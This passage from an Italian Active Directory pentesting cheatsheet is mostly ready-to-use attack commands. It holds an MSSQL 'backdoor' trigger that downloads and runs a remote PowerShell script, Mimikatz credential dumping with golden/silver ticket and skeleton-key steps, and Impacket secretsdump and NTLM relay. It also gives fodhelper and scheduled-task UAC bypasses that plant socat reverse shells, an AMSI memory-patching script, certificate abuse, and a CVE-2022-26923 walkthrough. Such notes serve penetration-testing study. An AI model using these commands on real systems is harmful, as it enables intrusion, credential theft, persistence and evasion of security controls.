      RECONFIGURE;
      GO #query che avvia la xp_cmdshell
<!-- -->        
      USE master
      
      GRANT IMPERSONATE ON LOGIN::<nome account admin> to [Public]; #comando che da i privilegi a tutti gli utenti, impersonandosi come admin del DB
<!-- --> 
      USE HRDB #utilizzo del DB HRDB

      CREATE TRIGGER [backdoor]
      ON HRDB.dbo.Employees 
      FOR INSERT AS
      
      EXECUTE AS LOGIN = 'sa'
      EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ip>:<porta>/<script>.ps1'')"';
      #query che crea un trigger che si connette ad uno nostro webserver e scarica il nostro script.ps1
<!-- --> 
- __Certificati:__

_la teoria sui certificati è [qui](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#certificati-ad)_

_Comandi:_
<!-- -->
      certutil -v -template #comando per listare i template
<!-- -->      
_caratteristiche dei template che interessano a noi:_

 1) template con i permessi di poter richiedere un certificato quali Allow Enroll o Allow Full Control
<!-- -->
        #Lo si trova greppando per ogni parola di Allow Enroll o Allow Full Control per poi vedere se il gruppo che ha questi privilegi è il gruppo in cui poi           apperteniamo anche noi
<!-- -->
 2) template che permetta l'autenticazione del client che verrà in seguito utilizzata per l'autenticazione al kerberos
<!-- -->
        #per trovarlo bisogna andare a vedere le proprietà della voce EKU e trovare la parola Client Authentication
<!-- -->
 3) template che permette di alterare il SAN (subject alternative name)
<!-- -->
        #Lo si trova greppando per CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, se settato a 1 possiamo modificare il SAN
<!-- -->
_Un template avendo le 3 caratteristiche elencate sopra potrà essere utilizzato a nostro vanataggio_
<!-- -->
     mmc #comando per aprire microfsoft management console
<!-- -->
     File-> aggiungi/rimuovi snap-in-> Certificati -> selezioniamo il mio account utente #passi per creare un certificato generale
<!-- -->
__N.B: senza privileggi possiamo selezionare account utente e non account servizi o account computer quando creiamo il certificato generale__
<!-- -->
     Console Root-> Certificati-> Personale-> tutte le attività-> richiedi nuovo certificato-> avanti-> scritta blu maggiori informazioni sono richieste->     
     #passi per creare il certificato personalizzato
<!-- -->
     #va inserito ora UPN dell'user che vogliamo impersonare nel campo SAN
<!-- -->
     Get-ADUser | fl * #comando per trovare gli user con UPN annesso se presente
<!-- -->
     #invece nel campo nome soggetto va cambiato con nome comune
<!-- -->
     Ok-> Enroll-> ora il certificato sarà pronto e deve essere esportato-> click destro sul certificato-> tutte le attività-> esporta-> selezionare si per   
     esportare la chiave privata -> ocnfigurare una password -> avanti e verrà esportato #passi per salvare ed esportare il certificato con la relativa chiave   
     privata
<!-- -->
__Esportare il certificato con chiave privata annessa è possibile anche con [Mimikatz](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz)__

_Ora non dobbiamo fare altro che prenderci il kerberos ticket_

link per scaricare [rubeus](https://github.com/GhostPack/Rubeus)
<!-- -->
     Rubeus.exe asktgt /user:<nome utente che deve coincidere con quello dell'UPN> /enctype:aes256 /certificate:<path del certificato> /password:<password 
     certificato> /outfile:<file dove verrà salvato il TGT> /domain:<dominio> /dc:<ip> #comando per richiedere il TGT tramite il nostro certificato
<!-- -->
     Rubeus.exe changepw /ticket:<path al file TGT> /new:<nuova password> /dc:<dominio> /targetuser:<dominio>\<user> #comando èer cambiare password dell'account 
     che vogliamo attaccare
<!-- -->
_Comandi per creare il certificato da CMD con il tool [ForgeCert](https://github.com/GhostPack/ForgeCert)_
<!-- -->
      ForgeCert.exe --CaCertPath <certificato esportato>.pfx --CaCertPassword <password> --Subject CN=<nome> --SubjectAltName <UPN> --NewCertPath <path o nome         dove salvare il file>.pfx --NewCertPassword <nuova password> #comando per creare il nostro certificato
<!-- -->
_Tool utile per l'audit dei certificati scaricabile [qua](https://github.com/GhostPack/PSPKIAudit)_

### Tools:

##### Powerview

_Scaricare PowerView.ps1 sulla macchina e avviarlo:_
<!-- spazio -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- spazio -->

_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:_
<!-- spazio -->
    Get-NetUser #ottiene le informazioni sugli utenti
<!-- spazio -->
    Get-NetUser | select cn #per ottenere solo il common name
<!-- spazio -->
    Get-NetUser -TrustedToAuth #comando per ottenere l'utenti che possono autenticarsi tramite trust o delegation
<!-- spazio -->
    Get-NetGroup #ottiene tutti i gruppi presenti a dominio
<!-- spazio -->
    Get-NetGroup -GroupName *admin* #ottiene tutti i gruppi in cui è presente la parola admin
<!-- spazio -->
    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio
<!-- spazio -->
    Get-NetComputer -FullData #ottiene tutte le informazioni su tutti i pc della rete
<!-- spazio -->
    Get-NetComputer -FullData | Select-Object logoncount #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi 
<!-- spazio -->
    Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose 
    #comando per aggiungere un oggetto alle ACL
<!-- -->
_Sopra vengono riportati i comandi utilizzati più di frequente, per una visione più completa dei comandi andare [qui](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)._

##### Bloodhund settings

__Bloodhound è un tool che permette l'organizazione delle informazioni ottenute dalla fase di recognition del'AD__

__Abbiamo bisogno di due tools: bloodhound e neo4j (che farà da database per bloodhound)__
<!-- -->
      sudo apt install neo4j && sudo apt install bloodhound
<!-- -->
      neo4j console #apriamo la console di neo4j per startare il db
<!-- -->
_Dobbiamo navigare sull'interfaccia web di neo4j per loggare e cambiare la password di default.
Cerchiamo perciò http://localhost:7474/ e logghiamo con le credenziali di default (neo4j:neo4j)
e inseriamo la nostra nuova password._

_Avviamo adesso bloodhound:_
<!-- -->
      bloodhound
<!-- -->
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando
(lo script powershell deve essere ovviamente già sulla macchina)_
<!-- -->
      . .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -OutputDirectory "<Path della cartella dove salvare lo zip>"
<!-- -->
_adesso scarichiamo il file sulla nostra macchina;
una volta fatto questo andiamo sull'interfaccia grafica di bloodhound e importiamo il file strisciandocelo sopra oppure selezionando l'icona importa mappa._

__N.B: Bloodhund entra nel vivo dando una visione d'insieme dell'AD target un campo dove può essere utilizzato è per le [DACL attacks](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)__

##### Mimikatz:
_Mimikatz è utilizzato per recuperare hash, password, recupero e creazione di ticket kerberos._

__Consigliamo di utilizzare mimikatz integrato con meterpreter per una maggiore praticità.__

__N.B: Alcuni di questi comandi richiedono che venga disattivato LSA del LSASS.__

Commandi:
<!-- -->
      privilege::debug #comando per assicurarsi di runnare mimikatz come amministratore
 <!-- -->
      token::elevate #comando che tenta di elevare i privilegi
<!-- -->
      lsadump::lsa /patch #comando per recupere NTLm hash
<!-- -->
      lsadump::sam #comando che tenta il dump del SAM
<!-- -->
      lsadump::dcsync /domain:<nome dominio> /all #comadno che esegue il dcsync attack su tutti gli utenti
<!-- -->
      sekurlsa::logonpasswords #comando che tenta di recuperare le password in cache
<!-- -->
      sekurlsa::credman #comando che tenta di recuperare le password dal credmanager
<!-- -->
      sekurlsa::tickets /export #comando per esportare i .kirbi tickets e li recupera da LSASS memoria
<!-- -->
      misc::cmd #comaneo per aprire un cmd 
<!-- -->
      kerberos::ptt <ticket> #comando per fare il pass the ticket
<!-- -->   
      log <nome file>.txt #comando per creare un file di log
<!-- -->   
_Golden ticket si ha accesso a tutti i servizi del kerberos._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid utente> /krbtgt:<NTLM utente> /id:<id utente> #comando per creare un golden ticket
<!-- -->
      kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid utente> /krbtgt:<NTLM hash> /endin:<minuti durata del ticket>      
      /renewmax:<minuti per il rinnovo del ticket> /ptt #comando che crea sempre un golden ticket ma più completo di varie opzioni
<!-- -->
_Silver ticket si ha accesso ad un servizio del kerberos è più silensiozo del golden._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid servizio> /krbtgt:<NTLM servizio> /id:<id servizio> #comando per creare un silver ticket
<!-- -->
      kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid servizio> /target:<hostname del dominio> /rc4:>NTLM hash> /service:<servizio           esempio CIFS /ptt #comando che crea sempre un silver ticket ma più completo di varie opzioni
<!-- -->
_Comandi per creare la skeleton key_
<!-- -->  
      !+ #comando mimikatz che importa mimidrv.sys
<!-- -->    
      !processprotect /process:lsass.exe /remove #comando per disattivare la protezione del LSA
<!-- -->    
      misc::skeleton #comando per creare la skeleton key
<!-- -->    
      !- #comando per rimuovere mimidrv.sys
<!-- -->    
_Comandi per i [certificati AD](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#certificati-ad)_
<!-- -->   
      crypto::certificates /systemstore:local_machine #comando per la verifica di certificati nella local machine
<!-- -->   
      crypto::capi #comando che utilizza la API CryptoAPI per delle modifiche
<!-- -->   
      crypto::cng #comando che modifica il KeyIso di windows
<!-- -->   
      crypto::certificates /systemstore:local_machine /export #comando per esportare il certificato
<!-- -->   
##### Suite impacket e utilizzi:
_in questa sezione vengono spiegati cosa e come funzionano i vari tool della suite Impacket._
<!-- -->
      impacket-GetUserSPNs #sfrutta la vulnerabilita di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi
<!-- -->
ES:
<!-- -->
_`impacket-GetUserSPNs -dc-ip <ip> <dominio>slash<utente>`_
<!-- -->
_`impacket-GetUserSPNs.py -dc-ip <ip> <dominio>slash<utente>_ -request-user <utente>`_ 
<!-- -->
      impacket-GetNPUsers  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza richiedere la password
<!-- -->
ES:_`impacket-GetNPUsers <nome_dominio>backslash<nome_account> -no-pass`_
<!-- -->
      impacket-secretsdump #recupera NTDS.DIt, SAM hashes locali
<!-- -->
ES:

_`impacket-secretsdump -dc-ip <ip_del_domain_controller> <nome_account>:<passoword>@<ip_domain_controller>`_

_`impacketsecretsdump.py -sam sam.bak -system system.bak LOCAL`_

_`impacket-secretsdump -just-dc <dominio>/<utente>@<ip>`_
<!-- -->     
      impacket-ntlmrelayx #ruba le credenziali NTLM quando vengono inviate tra utenti
<!-- -->
ES:_`impacket-ntlmrelayx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory_dove_salvare>`_ 
<!-- -->
      impacket-addcomputer #comando per aggiungere un computer a dominio
<!-- spazio -->
ES:_`impacket-addcomputer -dc-ip <domain_controller_ip> -computer-name <nome_computer> -computer-pass '<password>' '<nome_tdl_dominio><!-- -->:<!-- --><username>:<password>`_
<!-- -->
      impacket-smbserver #comando per startar un smb server
<!-- -->
ES:_`impacket-smbserver <Nome_share_da_inserire_nel_comando_di_upload> -smb2support <share_locale_che_condividi>`_
<!-- -->
### DACL attacks:
_viene riportata una piccola lista/metodologia di attacchi alla discretionary access list, piccola perchè sono molteplici le ACE che possono essere sfruttate :_

##### AddMember:
_AddMember viene utilizzato per aggiungere membri ad un gruppo e può essere utilizzato per un [priviliege escalation](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#privilege-escalation) più complesso_

_Comandi:_
<!-- -->
     Add-ADGroupMember "<nome gruppo>" -Members "<nome utente>" #comando per aggiungere ad un gruppo il membro specificato
<!-- -->
     Get-ADGroupMember -Identity "<nome gruppo>" #comando per vedere i membri al gruppo
<!-- -->
##### WriteDACL
_Viene sfruttata la misconfigurazione di poter editare la DACL, crei un user, lo aggiungiamo ai gruppi __"Remote Management Users"__ per controllare l'utente a distanza, al gruppo
__"Exchange Windows Permissions"__ gruppo dell'Active Directory che permette di modificare i permessi di dominio, infine importiamo powerView e tramite il comando __"Add-DomainObjectAcl"__ con __"-rights"__ DCSync potremmo dumpare tutti gli hash di dominio con secretsdump._
<!-- -->
       New-LocalUser <nome_account> -Password (echo "<password>" | convertTo-SecureString -AsPlainText -force) -FullName "<nome_completo>" -Description "<descrizione>"
<!---->
      _Add-localGroupMember -Group "Remote Management Users" -member tester4_
<!-- -->
      Add-localGroupMember -Group "Exchange Windows Permissions" -Member <nome_utente>
<!-- -->
_Questo comando aggiunge un ACL oggetto all'ACL list per un utente a dominio con diritti DSync che permettono di dumpare tutti gli hash a dominio:_
<!-- -->
      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose
<!-- -->
##### ForceChangePassword:
_ACE che ci permette di modificare la password dell'user corrente senza che conosciamo la password vecchia_

_Comandi:_
<!-- -->
     $Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
     Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
<!-- -->
##### GenericAll:
_ACE che ci permette il controllo totale sull'oggetto, possiamo cambiare password, aggiungere SPN ecc..._

_Comandi:_
<!-- -->
     Add-ADGroupMember -Identity "<nome gruppo>" -Members <nome membro> #comando per aggiungere utente ad un gruppo 
     $Password = ConvertTo-SecureString "<password>" -AsPlainText -Force 
     Set-ADAccountPassword -Identity "<nome utente>" -Reset -NewPassword $Password #comandi per settare una nuova password
<!-- -->
##### WriteOwner:

_Ace che permette di poter cambiare l'owner di un oggetto_

_Comandi:_
<!-- -->
     Set-DomainObjectOwner -Identity <SID gruppo> -OwnerIdentity "<nome utente>" -Verbose #comando per cambiare proprietario
<!-- -->

##### GenericWrite:

_ACE che permette di modificare campi non sicuri di un oggetto tipo il parametro ScriptPath_

### Bypass

##### Bypass UAC

__Per sapere cos'è l'UAC e come funziona andare [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)__

- Caso di compromissione GUI:

1) msconfig.exe: 

_cliccando tasto windows+R, scrivendo e aprendo msconfig e infine aprendo __processhacker__ potremmo notare che msconfig runna con un high token, grazie alla sua autoelevation apre direttamente il programma con i più alti privilegi e se andiamo nella sezione __tools__ del programma, cerchiamo command prompt potremmo ottenere una shell con permessi elevati._

2) azman.msc __(vecchia utility winserver 2003 utilizzata per gestire i permessi)__:

_aprendo esegui, avviando azman.msc anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._ 

3) mmc.exe:

_Funziona anche con mmc.exe anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._

- Caso di compromissione AutoElevation:

1) fodhelper __(executable di windows per le lingue)__:

_Avviando possiamo notare che avrà un IL high, usando procmon.exe possiamo osservare che il sistema operativo va a ricercare quale software utilizzare per aprire fodhelper questo perchè nei sistemi operativi Windows esiste il ProgID cioè ad un'estensione è associata un programma di default ed è specificato in genere all'interno della chiave HKEY_CLASSES_ROOT che è un'insieme delle chiavi (HKCU e HKEY).
Nell'exploit possiamo notare che nella HKCU, più precisamente nella subykey con questo path __"shell/open/command"__ è dove viene anche specificato il ProgID possiamo  bypassare la system wide association(data un estensione tipo .txt, utilizziamo programma/i di default) andando ad inserire una revshell nella subkey, cosi facendo otteremo una shell privilegiata perchè lo stessto programma è avviato con IL high:_
__N.B: è importante almeno essere nel gruppo amministratori per poter editare i registri.__

Commandi:
<!-- -->
      net user <nome utente> | find "Local Group" #comando per vedere il gruppo di appartenenza 
<!-- -->
      whoami /groups | find "Label" #comando per capire il proprio IL
<!-- -->
      set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command #settare una variabile d'ambiente con il path specificato 
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<porta> EXEC:cmd.exe,pipes" #comando che crea una variabile d'ambiente che crea al suo interno un socat per       la revshell
<!-- -->
      reg add %REG_KEY% /v "DelegateExecute" /d "" /f #viene aggiunta la chiave di registro.
      /v specifica il nome 
      /d i dati all'interno
      /f force per evitare ogni prompt di conferma
<!-- -->
      reg add %REG_KEY% /d %CMD% /f #comando per inserire la revshell
<!-- -->
      nc -lnvp <port> #comando per aprire listener sulla nostra macchine
<!-- -->
      fodhelper.exe #comando per avviare l'eseguibile
<!-- -->
      reg delete HKCU\Software\Classes\ms-settings\ /f #comando per eliminare e quindi pulire le tracce
<!-- -->
_Dopo aver fatto tutti i comandi ed infine avviato l'eseguibile e se avremmo anche aperto un listener dovremmo ottenere la revshell con un IL high._

2) fodhelper con AV attivo:

_abbiamo l'AV attivo bene per bypassare l'antivirus viene messa appunto una strategia efficare tramite l'utilizzo di Curver entry(Curver entry è utilizzato quando si hanno più istanze di uno stesso software ma di diverse versioni, curver permette a Windows di utilizzare la versione di default)._

Commandi:
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes" #comando per la revshell
<!-- -->
      reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f #creiamo la subkey .thm con all'interno la revshell
<!-- -->
      reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f #creiamo la subkey curver che punta alla subkey .thm contenente la revshell
<!-- -->
      nc -lnvp <port> #creiamo il listener
<!-- -->
      fodhelper.exe #startiamo l'eseguibile
<!-- -->
Abbiamo ottenuto la revshell con IL high anche se attivo l'antivirus

Possono sorgere dei problemi se nelle UAC settings è attiva l'opzione Always Notify perchè ogni modifica deve essere autorizzata esempio l'exploit di fodhelper
però c'è ancora un modo per bypassare UAC è tramite gli scheduler task, che sono avviati da utenti normali ma eseguiti con privilegi d' amministratore e il tampering di variabili d'ambiente.

- Bypass tramite scheduler:

1) DiskCleanup:

_Andando a visionare lo scheduler task e cercano il DiskCleanup possiamo notare che ogni utente può utilizzarlo e verrà eseguito con privilegi di amministratore
N.B(la voce __"Run with highest privileges"__  eredita IL da chi lo avvia quindi da un'utente non-admin avrà IL medium).
Andando poi nella sezione __"Actions"__ possiamo notare che runna il programma tramite comando cmd e fin qui tutto normalre, tranne per le variabili d'ambiente che possono essere modificate a nostro vantaggio._

Comandi:
<!-- -->
      reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes &REM" /f
      #crea una subkey con nome windire che simula la varible d'ambiente %windir% e che poi ha al suo interno una revshell il $REM serve a commentare il resto
<!-- -->
      nc -lnvp <port> #comando per il listener
<!-- -->
      schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I #avvia il task con la revshell 
<!-- -->
      reg delete "HKCU\Environment" /v "windir" /f #comando per eliminare la subkey creata in precendenza
<!-- -->
_Esiste un tool chiamato [UACME](https://github.com/hfiref0x/UACME) che automatizza il bypass dell'UAC._

##### Bypass AMSI:

_Lascio qui il [link](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#amsi) dove viene spiegato cos'è l'AMSI_

- __Powershell Downgrade:__

_Il powershell downgrade consiste nel passare a una versione meno recente di powershell per evitare quelle features di sicurezza introdotte nella versioni più recenti._

__N.B: Le feature sono state introdotte nella versione 5.0 di powershell__

_Comandi:_
<!-- -->
      powershell -Version <num versione> #comando per cambiare versione
<!-- -->

_Questo tipo di bypass funziona se presente l'engine delle versione meno recenti di powershell, è inoltre possibile utilizzare il tool [Unicorn](https://github.com/trustedsec/unicorn) per automatizzare il tutto_

- __Powershell riflesso:__

_Consiste nell'utilizzare lo stesso powershell per disattivare l'AMSI_

_Comandi:_
<!-- -->
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') #linea di codice che recuperà il tipo di assembly utilizzato dalla shell corrente, [Ref]        indica di passare un valore ad un'altra funzione
<!-- -->
     .GetField('amsiInitFailed','NonPublic,Static') #line di codice che recuperà il campo amsiInitFailed e lo setta statico e non pubblico
<!-- -->
     .SetValue($null,$true) #linea che setta il campo amsiInitfailed a true
<!-- -->
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) #linea di codice     
     completa
<!-- -->
_Patching:_

_Analizzando il codice è possibile sovrascrivere la zona di memoria della funzione __"AmsiScanBuffer"__, in modo che analizzi quello che vogliamo_

_Codice:_
<!-- -->
     [DllImport(`"kernel32`")] 
     public static extern IntPtr GetProcAddress( 
     	IntPtr hModule, #handle della DLL
     	string procName #nome della variabile o funzione
     ); 
     
     [DllImport(`"kernel32`")]
     public static extern IntPtr GetModuleHandle(
     	string lpModuleName #modulo per ottenere l'handl
     );
     
     [DllImport(`"kernel32`")]
     public static extern bool VirtualProtect(
     	IntPtr lpAddress, #indirizzo regione
     	UIntPtr dwSize,   #grandezza
     	uint flNewProtect, #opzioni protezione
     	out uint lpflOldProtect  #puntatore alle vecchio protezioni
     ); #definizione dell'API Kernel32 con i relativi metodi

     $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #comando per caricare le API call

     $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); #array di byte spazzatura da scrivere

     $handle = [Win32.Kernel32]::GetModuleHandle(
	         'amsi.dll' #definzione da dove prendere l'handle
     );
     
     [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
    	      $handle,  #varibile handle di amsi.dll
    	     'AmsiScanBuffer'  #API call da prendere
     ); 
    
     [UInt32]$Size = 0x5; #variabile che stora la grandezza
     [UInt32]$ProtectFlag = 0x40; #read and write page
     [UInt32]$OldProtectFlag = 0; 
     [Win32.Kernel32]::VirtualProtect(
    	  $BufferAddress, #puntatore alla funzione AmsiScaneBuffer 
    	  $Size, #grandezza
    	  $ProtectFlag, #attivazione read and write
    	  [Ref]$OldProtectFlag
     ); 
     
     [system.runtime.interopservices.marshal]::copy(
    	  $buf, #byte da scrivere
    	  0, #da dove iniziare a scrivere
    	  $BufferAddress, #indirizzo di memoria da dove scrivere
    	  6 #numeri elementi da scrivere
     ); 
<!-- -->
__N.B: non è scontato da sottolineare che questo snippet di codice è già segnato da molti antivirus e EDR, per utilizzarlo si può considerare di obfuscarlo o encodarlo__

- __Tool:__

_Esistono come al solito dei tool per automatizzare il processo quali:_

- [Amsi.fail](http://amsi.fail/)

- [AMSITrigger](https://github.com/RythmStick/AMSITrigger)


##### Bypass Applocker:

_Applocker è un'applicazione di windows (vers. Enterprise) che permette di controllare quali programmi possono essere avviati da remoto o dal proprio pc da determinati utenti, e lo fa tramite delle regole specifiche_

- Cartelle in Whitelist:

_Vi è la possibilità che alcune cartelle non siano in blacklist, quindi bastera semplicemnte copiare o spostare l'eseguibile in codeste posizioni_

ES:

C:\Windows\System32\spool\drivers\color

# CVE:

_Nella sezione CVE non è umanemante possibile scriverle tutte ma ne verrannò presentate e spiegate alcune come esempio, in primo luogo e per secondo fine per imparare ulteriori componenti che fanno parte dell'Active directory._

### CVE-2022-26923: (Vulnerabilità sui certificati dell'AD)
<!-- -->
   _La vulnerabilità sfrutta la misconfigurazione dei certificati nell'AD e la possibilità che un utente può aggiungere fino a 10 macchine al gruppo machine    dell'active directory, esitono 2 template quello User e quello machine, lo User non è sfruttabile in quanto non possiamo modificare i parametri del __UPN__ (User Principal Name) che si trova dentro al __SAN__ (Subjec ALternative Name) invece nel template machine, dopo aver aggiunto un nuova macchina al gruppo dei computer possiamo generare un certificato in cui cambiamo il DNS hostname con quello del domain controller e ottenere NTLM Hash._
<!-- --> 
_Comandi:_
<!-- -->
      . ./Certify.exe find /vulnerable #per verificare se vulnerabile
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_certificato> -ca       
      <dominio_certificate_autority> #comando per generare un certificato /#se selezionamo il template machine, al computer aggiunto va scritto un $ alla fine del       nome
<!-- -->
      certipy-ad auth -pfx <file configurazione>.pfx #fa la convalida del certificato interrogando il kerberos e prova a recuperare NTLM hash dell'account con impacket
<!-- -->
_Comandi powershell per modificare le proprità di un computer nell'AD:_ 
<!-- -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
      #aggiungere il computer al gruppo della machine di active directory 
<!-- -->
      Get-ADComputer <nome computer> -properties dnshostname,serviceprincipalname
<!-- -->
      Set-ADComputer THMPC -ServicePrincipalName @{}#importante rendere vuoto SPN perchè entra in conflitto con quello dell'active directory
<!-- -->
      Set-ADComputer <nome dominio> -DnsHostName <nome del completo del dominio>
<!-- -->
_Rigenerare il certificato di template machine e tramite __Certipy auth__ prendere NTLM hash e il gioco è fatt0._
<!-- -->

##### Certificati AD:

___"AD CS"__ (Active Directory Certificate Services) è il servizio che si occupa di gestire i certificati, è molto utile in quanto per tutti i computer, servizi all'interno dell'AD si occupa lui stesso di essere il loro __"CA"__ (Certificate Authority), si occupa di creare dei __"Certificate template"__ i quali indicano chi utente e con quali determinati permessi può richiedere un certificato ed infine si occupa di criptare i file systems, creare e verificare le firme digitali.
I certificati hanno una peculiarità che li rende interessati che anche se ad un'account compromesso viene cambiata la password loro non ne vengono intaccati, potendo cosi permettere la [persistence](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#varie)(al seguente link è spiegato un metodo di persistenza) nel sistema windows_

- __Funzionamento:__

1) l'user genera la coppia chiave pubblica e privata

2) l'user invia la certificate requesta alla CA

3) controllo del certificate template e dei permessi

4) esito positivo, generazione del certificato e firma con la chiave privata del CA

5) l'user lo registra nel sistema windows e lo utilizzerà quando ne avrà bisogno

### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._

_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._

_SPN(Service Principal Name) sono identificatori nell'AD per identificare dei servizi o risorse come un server SQL._

_Commando per avviare il subsystem di linux._
<!-- -->
      Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
<!-- -->
# Windows:

### Processi di avvio

_Schema per semplificare la spiegazione dei processi:_

_system (Primo processo, colui che da il via a tutto)_

Sytem crea:

- _smss.exe (Session Manager Subsystem ,processo che crea nuove sessioni e variabili d'ambiente, si termina da solo)_

smss.exe crea:
          
- _win32k.sys (kernel mode, si occupa della GUI di windows)_
  
- _winsrv.dll (user mode, gestisce le attività legate alla creazione, gestione e interazione con il desktop di Windows)_
  
- _csrss.exe (user mode, responsabile della Win32 console, creazione e eliminazione di thread, rende disponibile le API ad altri processi)_

csrss.exe crea:

- _winlogon.exe (session 1, sessione utente si occupa del logon e logoff utenti e carica il profilo dell'utente dopo il logon)_

- _wininit.exe (session 0, una sessione isolata per il sistema operativo windows, si occupa dell'avvio)_

wininit.exe crea:

- _explorer.exe (si occuppa dell'accesso a file e cartelle per l'utente)_

- _lsass.exe (Local Security Authority) e lsaiso.exe(processo collegato con credential guard and keyguard, lo si vede solo se attivi)_

- _services.exe (Service control manager, si occupa di tutto quello che riguarda i servizi)_

services.exe crea:

- _svchost.exe (Host process, si occupa di ospitare e controllare un servizio, è completamente gestito da services.exe)_

_Approfondimenti per gli eseguibli sopra elencati:_ 

_services.exe:_
gestisce un DB con i vari servizi ed è possibile interrogarlo con l'eseguibile __"sc.exe"__, inoltre troviamo altre informazioni nelle chiavi di registro __"HKLM\System\CurrentControlSet\Services"__ è anche responsabile al settaggio del __LastKnownGood__ (Una sorta di backup per windows).

_svchost.exe:_
I servizi runnati da questo processo sono implementati come DLL e sono immagazzinate nella subkey __Parameters__ a questo path __"KLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters"__, per vederli basta fare click desto su process hacker, notiamo il servizio che runna, se rifacciamo click destro su __"Proprietà"__, otterremo maggiori info, una cosa è importante che vi sia la flag -k che è il key identifier.

_Tools:_

Vari sono i tool per tenere d'occhio i processi, noi ne elenchiamo alcuni:

- process hacker

- procmon dell suite dei sysinternal

- TaskManager integrato in windows
(__N.B è consigliato nella sezione __"Details"__ di aggiungere le colonne "Image Path Name" e "Command Line"
per vedere cosa un processo fa e il suo path__)

### API

_I programmi molte volte hanno bisogno di comunicare con la componente hardware o con il sistema stesso di windows è cosi che nascono le Win 32 Api, librerie che fanno da interfaccia tra la user-mode delle applicazione e il kernel._

__N.B: esistono tue tipi di accesso all'hardware: User-mode(no accesso diretto all'hardware, propria locazione di memoria) Kernel-mode(Accesso diretto ad hardware e memoria fisica).__

__Componenti delle API:__

- Header file: Definisce le librerie da importare durante il run-time, il programma a cui servono utilizzerà dei puntatori per reperirle.

- Core DLLs: gruppo di DLL che definisco la struttura di chiamate.
 ES:(KERNEL32, USER32, ADVAPI32) queste definiscono i servizi user e kernel. 

- DLLs supplementari: DLL che controllano parti del subsystem di windows OS, sono 36.

- Call Structures: Definisce la API stessa e i parametri da passargli.
  ES:
  
<!-->
      BOOL WriteProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPVOID  lpBaseAddress,
      [in]  LPCVOID lpBuffer,
      [in]  SIZE_T  nSize,
